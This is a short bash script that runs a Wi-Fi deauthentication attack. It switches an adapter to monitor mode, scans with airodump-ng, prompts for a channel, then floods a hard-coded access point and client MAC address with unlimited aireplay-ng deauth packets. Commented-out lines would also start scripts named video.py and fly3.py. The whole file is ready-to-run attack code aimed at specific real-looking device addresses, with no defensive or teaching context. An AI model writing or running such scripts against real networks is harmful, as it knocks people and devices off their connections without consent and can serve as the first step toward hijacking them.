#!/bin/bash

# Define cleanup function to kill all background processes on Ctrl+C
cleanup() {
    echo -e "\n[+] Caught Ctrl+C! Stopping all background processes cleanly..."
    # Kill all background jobs started by this script shell
    kill $(jobs -p) 2>/dev/null
    exit 0
}

# Set the trap at the beginning to catch Ctrl+C (SIGINT)
trap cleanup SIGINT

# 1. Put the interface into monitor mode
echo "[+] Setting wlx00c0cabe245c to monitor mode..."
sudo ip link set wlx00c0cabe245c down
sudo iw dev wlx00c0cabe245c set type monitor
sudo ip link set wlx00c0cabe245c up

# 2. Start the initial packet capture
echo "[+] Starting initial airodump-ng scan. Press [CTRL+C] when you have found your target."
sudo airodump-ng wlx00c0cabe245c

# 3. Wait for user input to proceed and get the channel
echo ""
read -p "Enter the target channel number: " channel_num

# 4. Launch the Python scripts in the background
# echo "[+] Starting video.py and fly3.py in the background..."
# python3 video.py &
# python3 fly3.py &

# 5. Launch the targeted scan and the deauth attack together
echo "[+] Starting targeted airodump-ng and aireplay-ng deauth attack..."
echo "[+] Press [CTRL+C] at any time to exit and stop all attacks perfectly."

# Run the targeted airodump-ng in the foreground so you can view it
sudo airodump-ng -c "$channel_num" --bssid A0:14:3D:A6:F1:D5 wlx00c0cabe245c

# Run the deauth attack
sudo aireplay-ng --deauth 0 -a A0:14:3D:A6:F1:D5 -c C6:7A:1A:22:AC:6E wlx00c0cabe245c



# If the foreground airodump-ng exits on its own, trigger the cleanup function anyway
cleanup
